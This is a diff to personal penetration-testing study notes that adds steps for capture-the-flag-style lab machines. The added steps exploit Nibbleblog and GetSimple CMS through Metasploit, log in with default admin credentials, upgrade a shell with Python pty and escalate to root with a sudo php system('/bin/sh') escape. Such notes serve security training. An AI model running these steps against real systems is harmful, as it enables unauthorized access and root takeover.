@@ -212,6 +212,10 @@ When performing password cracking offline with a tool such as Hashcat or attempt
 * `sudo /home/nibbler/personal/stuff/monitor.sh`
 * find flag in ~/ as root
 
+### Alternate User Method - Metasploit
+* search nibbleblog
+* `use 0`
+* set the hosts
 
 
 ## Public Exploits (TASK)
@@ -237,3 +241,24 @@ When performing password cracking offline with a tool such as Hashcat or attempt
 3. chmod 600
 4. login with ```ssh root@<ip> -p <port> -i <keyyoufound>```
 5. ```cat /root/flag.txt```
+
+
+
+## Knowledge Check (TASK)
+
+   1. `nmap -sV -sC -Pn <ip> -> found robots.txt`
+   2. look at robots to find admin page
+   3. try admin admin -> lets me log in
+   4. see the version is below 3.3.15
+   5. search on metasploit using `search getsimple 3.3.15` and use exploit 0
+   6. set RHOST AND LHOST, then exploit
+   7. use shell command to get a shell
+   8. `python3 -c 'import pty; pty.spawn("/bin/bash")'` -> finally gets you a good shell
+   9. `cd /`
+   10. `cat mrb3n/user.txt` -> flag 1
+   11. Look at gtfobins for php trying to get sudo
+   12. `CMD="/bin/sh"`
+   13. `sudo php -r "system('$CMD');"` -> now root
+   14. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+   15. `cd /root`
+   16. cat the file for flag
